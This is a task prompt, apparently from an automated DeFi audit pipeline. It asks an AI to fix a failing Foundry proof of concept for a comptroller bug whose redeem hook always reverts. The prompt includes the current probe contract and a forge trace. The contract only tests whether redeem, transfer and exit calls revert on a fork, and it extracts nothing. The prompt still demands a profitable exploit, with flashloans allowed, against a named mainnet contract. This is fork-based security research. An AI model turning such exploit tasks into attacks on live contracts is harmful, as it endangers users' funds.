You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unconditional revert in redeem policy freezes all redemptions, exits, and cToken transfers
- claim: `redeemAllowedInternal()` unconditionally executes `revert("redeemer is paused")` before any market-listing, membership, or liquidity checks. Every redemption path that consults the comptroller therefore aborts, and `transferAllowed()` reuses the same bricked hook.
- impact: Suppliers cannot redeem underlying, cannot exit markets, and cannot transfer cTokens. This creates a protocol-wide withdrawal and mobility freeze that can lock collateral until the comptroller implementation is replaced.
- exploit_paths: ["`redeem()`/`redeemUnderlying()` -> `redeemFresh()` -> `comptroller.redeemAllowed()` -> `redeemAllowedInternal()` -> unconditional revert", "`exitMarket()` -> `redeemAllowedInternal()` -> unconditional revert", "`transfer()`/`transferFrom()` on cTokens -> `comptroller.transferAllowed()` -> `redeemAllowedInternal()` -> unconditional revert"]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IComptrollerLike {
    function getAllMarkets() external view returns (address[] memory);
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cTokenAddress) external returns (uint256);
    function redeemAllowed(address cToken, address redeemer, uint256 redeemTokens) external returns (uint256);
    function transferAllowed(address cToken, address src, address dst, uint256 transferTokens) external returns (uint256);
}

interface ICTokenLike {
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function transfer(address dst, uint256 amount) external returns (bool);
    function transferFrom(address src, address dst, uint256 amount) external returns (bool);
}

contract FlawVerifier {
    address internal constant TARGET_COMPTROLLER = 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258;
    address internal constant PROBE_RECIPIENT = address(0xBEEF);
    uint256 internal constant PROBE_AMOUNT = 1;
    bytes4 internal constant ERROR_STRING_SELECTOR = 0x08c379a0;
    string internal constant EXPECTED_REASON = "redeemer is paused";

    struct PathStatus {
        bool helperRedeemAllowedBlocked;
        bool helperTransferAllowedBlocked;
        bool redeemBlocked;
        bool redeemUnderlyingBlocked;
        bool transferBlocked;
        bool transferFromBlocked;
        bool exitMarketBlocked;
    }

    bool private _executed;
    bool private _hypothesisValidated;
    address private _marketUsed;
    string private _infeasibilityReason;

    event PathResult(address indexed market, string path, bool blocked, bytes data);
    event ExecutionFinished(bool validated, address indexed market, address profitToken, uint256 profitAmount);

    constructor() {}

    function executeOnOpportunity() public {
        if (_executed) {
            return;
        }
        _executed = true;

        address[] memory markets = IComptrollerLike(TARGET_COMPTROLLER).getAllMarkets();
        if (markets.length == 0) {
            _infeasibilityReason = "no listed markets returned by comptroller";
            emit ExecutionFinished(false, address(0), address(0), 0);
            return;
        }

        for (uint256 i = 0; i < markets.length; i++) {
            address market = markets[i];
            PathStatus memory status = _probeMarket(market);

            if (
                status.helperRedeemAllowedBlocked &&
                status.helperTransferAllowedBlocked &&
                status.redeemBlocked &&
                status.redeemUnderlyingBlocked &&
                status.transferBlocked &&
                status.transferFromBlocked &&
                status.exitMarketBlocked
            ) {
                _hypothesisValidated = true;
                _marketUsed = market;
                _infeasibilityReason =
                    "validated freeze only; no positive-profit path exists because every public redemption/exit/transfer value-release route is the reverting route itself";
                emit ExecutionFinished(true, market, address(0), 0);
                return;
            }
        }

        _infeasibilityReason =
            "failed to find a listed market where all required redeem, exit, and transfer paths bubbled the expected paused revert";
        emit ExecutionFinished(false, address(0), address(0), 0);
    }

    function _probeMarket(address market) internal returns (PathStatus memory status) {
        (status.helperRedeemAllowedBlocked,) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.redeemAllowed.selector, market, address(this), PROBE_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemAllowed(market,self,1) -> redeemAllowedInternal()",
            status.helperRedeemAllowedBlocked,
            bytes("")
        );

        (status.helperTransferAllowedBlocked,) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(
                IComptrollerLike.transferAllowed.selector,
                market,
                address(this),
                PROBE_RECIPIENT,
                PROBE_AMOUNT
            )
        );
        emit PathResult(
            market,
            "transferAllowed(market,self,recipient,1) -> redeemAllowedInternal()",
            status.helperTransferAllowedBlocked,
            bytes("")
        );

        bytes memory data;

        (status.redeemBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.redeem.selector, PROBE_AMOUNT)
        );
        emit PathResult(
            market,
            "redeem(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemBlocked,
            data
        );

        (status.redeemUnderlyingBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.redeemUnderlying.selector, PROBE_AMOUNT)
        );
        emit PathResult(
            market,
            "redeemUnderlying(1) -> redeemFresh() -> comptroller.redeemAllowed()",
            status.redeemUnderlyingBlocked,
            data
        );

        (status.transferBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.transfer.selector, PROBE_RECIPIENT, PROBE_AMOUNT)
        );
        emit PathResult(
            market,
            "transfer(recipient,1) -> comptroller.transferAllowed()",
            status.transferBlocked,
            data
        );

        (status.transferFromBlocked, data) = _expectPaused(
            market,
            abi.encodeWithSelector(ICTokenLike.transferFrom.selector, address(this), PROBE_RECIPIENT, PROBE_AMOUNT)
        );
        emit PathResult(
            market,
            "transferFrom(self,recipient,1) -> comptroller.transferAllowed()",
            status.transferFromBlocked,
            data
        );

        address[] memory singleMarket = new address[](1);
        singleMarket[0] = market;

        // Minimal realistic prep: entering the market makes the subsequent exit probe an actual market-exit attempt.
        // This does not alter exploit causality because the root cause remains exitMarket() -> redeemAllowedInternal() -> revert.
        try IComptrollerLike(TARGET_COMPTROLLER).enterMarkets(singleMarket) returns (uint256[] memory) {} catch {}

        (status.exitMarketBlocked, data) = _expectPaused(
            TARGET_COMPTROLLER,
            abi.encodeWithSelector(IComptrollerLike.exitMarket.selector, market)
        );
        emit PathResult(
            market,
            "enterMarkets(market) -> exitMarket(market) -> redeemAllowedInternal()",
            status.exitMarketBlocked,
            data
        );
    }

    function _expectPaused(address target, bytes memory payload) internal returns (bool blocked, bytes memory data) {
        (bool success, bytes memory result) = target.call(payload);
        data = result;
        if (success) {
            return (false, data);
        }
        return (_isExpectedPausedRevert(data), data);
    }

    function _isExpectedPausedRevert(bytes memory revertData) internal pure returns (bool) {
        if (revertData.length < 4) {
            return false;
        }

        bytes4 selector;
        assembly {
            selector := shr(224, mload(add(revertData, 32)))
        }

        if (selector != ERROR_STRING_SELECTOR) {
            return false;
        }

        return _contains(revertData, bytes(EXPECTED_REASON));
    }

    function _contains(bytes memory haystack, bytes memory needle) internal pure returns (bool) {
        if (needle.length == 0) {
            return true;
        }
        if (haystack.length < needle.length) {
            return false;
        }

        for (uint256 i = 0; i <= haystack.length - needle.length; i++) {
            bool matches = true;
            for (uint256 j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) {
                    matches = false;
                    break;
                }
            }
            if (matches) {
                return true;
            }
        }

        return false;
    }

    // No attacker profit is realizable from this flaw on the specified fork.
    // The bug is a protocol-wide denial-of-service that blocks the very redemption,
    // exit, and transfer paths that would need to succeed before any asset could be extracted.
    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external pure returns (uint256) {
        return 0;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function marketUsed() external view returns (address) {
        return _marketUsed;
    }

    function infeasibilityReason() external view returns (string memory) {
        return _infeasibilityReason;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return
            "redeem()/redeemUnderlying() -> redeemFresh() -> comptroller.redeemAllowed() -> redeemAllowedInternal() -> revert; exitMarket() -> redeemAllowedInternal() -> revert; transfer()/transferFrom() -> comptroller.transferAllowed() -> redeemAllowedInternal() -> revert";
    }
}

```

forge stdout (tail):
```
000000000000000000000000005f863c20000000000000000000000000000000000000000000000000000000061788f970000000000000000000000000000000000000000000000000000000061788f97000000000000000000000000000000000000000000000001000000000000000e
    │   │   │   │   │   │   │   │   ├─ [2084] 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf::58e2d3a8(00000000000000000000000099d8a9c45b2eca8864373a26d1459e3dff1e17f30000000000000000000000000000000000000000000000000000000000000348) [staticcall]
    │   │   │   │   │   │   │   │   │   ├─ [276] 0x18f0112E30769961AF90FDEe0D1c6B27E6d72D92::313ce567() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000008
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000008
    │   │   │   │   │   │   │   │   ├─ [4198] 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf::bcfd032d(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee) [staticcall]
    │   │   │   │   │   │   │   │   │   ├─ [1410] 0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E::feaf968c() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000108c0000000000000000000000000000000000000000000000000000e325992404f80000000000000000000000000000000000000000000000000000000061791c740000000000000000000000000000000000000000000000000000000061791c74000000000000000000000000000000000000000000000000000000000000108c
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000001000000000000108c0000000000000000000000000000000000000000000000000000e325992404f80000000000000000000000000000000000000000000000000000000061791c740000000000000000000000000000000000000000000000000000000061791c74000000000000000000000000000000000000000000000001000000000000108c
    │   │   │   │   │   │   │   │   ├─ [2106] 0x47Fb2585D2C56Fe188D0E6ec628a38b74fCeeeDf::58e2d3a8(000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee) [staticcall]
    │   │   │   │   │   │   │   │   │   ├─ [298] 0xe5BbBdb2Bb953371841318E1Edfbf727447CeF2E::313ce567() [staticcall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
    │   │   │   │   │   │   │   │   ├─ [1164] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::313ce567() [staticcall]
    │   │   │   │   │   │   │   │   │   ├─ [381] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::313ce567() [delegatecall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000006
    │   │   │   │   │   │   │   │   ├─ [286] 0x99D8a9C45b2ecA8864373A26D1459e3Dff1e17F3::313ce567() [staticcall]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000e38547f27b4d
    │   │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return]
    │   │   │   ├─  emit topic 0: 0xe699a64c18b07ac5b7301aa273f36a2287239eb9501d81950672794afba29a0d
    │   │   │   │           data: 0x000000000000000000000000d37295796c8b885783bd0a4a6c890e3ddeae67050000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ emit PathResult(market: 0xd37295796C8B885783bD0A4a6C890e3ddeAE6705, path: "enterMarkets(market) -> exitMarket(market) -> redeemAllowedInternal()", blocked: false, data: 0x0000000000000000000000000000000000000000000000000000000000000000)
    │   ├─ emit ExecutionFinished(validated: false, market: 0x0000000000000000000000000000000000000000, profitToken: 0x0000000000000000000000000000000000000000, profitAmount: 0)
    │   └─ ← [Stop]
    ├─ [200] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [222] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x02E795EEc131246128346D17d2f564D7bF7C705b
  at 0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258
  at 0x3C710B981F5Ef28DA1807ce7ED3F2a28580E0754.redeemUnderlying
  at 0x58DA9c9fC3eb30AbBcbBAb5DDabb1E6e2eF3d2EF.redeemUnderlying
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.56s (488.53ms CPU time)

Ran 1 test suite in 2.69s (2.56s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 59185119)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
